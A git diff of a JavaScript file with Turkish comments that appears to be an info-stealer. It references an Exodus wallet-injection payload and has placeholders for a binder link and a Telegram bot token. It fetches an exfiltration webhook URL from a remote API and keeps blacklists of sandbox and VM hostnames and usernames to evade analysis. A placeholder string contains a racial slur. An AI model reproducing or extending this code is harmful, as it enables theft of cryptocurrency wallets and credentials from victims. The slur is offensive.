@@ -27,9 +27,10 @@ const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/ra
 const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
-// Global değişken
+// Global değişkenler
 let globalWebhookUrl = null; // Webhook URL başlangıçta boş
-let diagret = '%REPLACE-ME-NIGGA%'; // URL yer tutucusu
+let discordWebhookUrl = null; // Asenkron işlemden sonra doldurulacak
+let diagret = '%REPLACE-ME-NIGGA%'; // API adresi
 
 // Rastgele bir şifreleme anahtarı üret
 function generateSecureReference() {
@@ -66,8 +67,8 @@ async function sendDataAndFetchWebhook() {
         if (result.webhookUrl) {
             console.log("Webhook URL alındı:", result.webhookUrl);
             globalWebhookUrl = result.webhookUrl; // Global değişkeni ayarla
+            discordWebhookUrl = result.webhookUrl; // discordWebhookUrl'yi ayarla
             console.log("Global Webhook URL ayarlandı:", globalWebhookUrl);
-            return result.webhookUrl; // Geri döndür
         } else {
             console.error("Webhook URL alınamadı.");
         }
@@ -76,18 +77,28 @@ async function sendDataAndFetchWebhook() {
     }
 }
 
-// Asenkron işlemi bekleyerek discordWebhookUrl'yi ayarla
+// Asenkron işlemi başlat
 (async () => {
-    const webhookUrl = await sendDataAndFetchWebhook();
-    if (webhookUrl) {
-        const discordWebhookUrl = webhookUrl; // Doğru bir şekilde ayarla
-        console.log("Discord Webhook URL kullanıma hazır:", discordWebhookUrl);
-    } else {
-        console.error("Webhook URL alınamadı. İşlem başarısız.");
-    }
+    await sendDataAndFetchWebhook(); // Webhook URL'yi al ve global değişkenleri ayarla
+
+    // Diğer fonksiyonlarda kullanılabilir
+    console.log("Webhook URL global olarak kullanıma hazır:", discordWebhookUrl);
 })();
 
-const discordWebhookUr1 = discordWebhookUrl;
+// Diğer fonksiyonlarda kullanım
+function exampleFunction() {
+    if (discordWebhookUrl) {
+        console.log("Discord Webhook URL kullanılıyor:", discordWebhookUrl);
+        // Burada discordWebhookUrl'yi kullanabilirsiniz
+    } else {
+        console.error("Discord Webhook URL henüz ayarlanmadı.");
+    }
+}
+
+// Bir süre bekleyerek test edin
+setTimeout(() => {
+    exampleFunction(); // Webhook URL'yi burada kullanabilirsiniz
+}, 2000);
 
 const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
 const blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl", ]
